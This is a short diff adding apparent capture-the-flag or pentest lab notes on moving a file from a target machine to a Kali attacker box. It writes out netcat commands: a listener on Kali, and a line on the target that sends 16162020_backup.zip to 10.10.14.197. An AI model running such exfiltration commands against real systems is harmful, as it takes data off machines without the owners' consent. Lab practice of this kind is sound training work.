@@ -1,0 +1,6 @@
+From target to kali:
+on kali:
+nc -l -p 2345 > 16162020_backup.zip
+
+on target:
+nc -w 3 10.10.14.197 2345 < 16162020_backup.zip
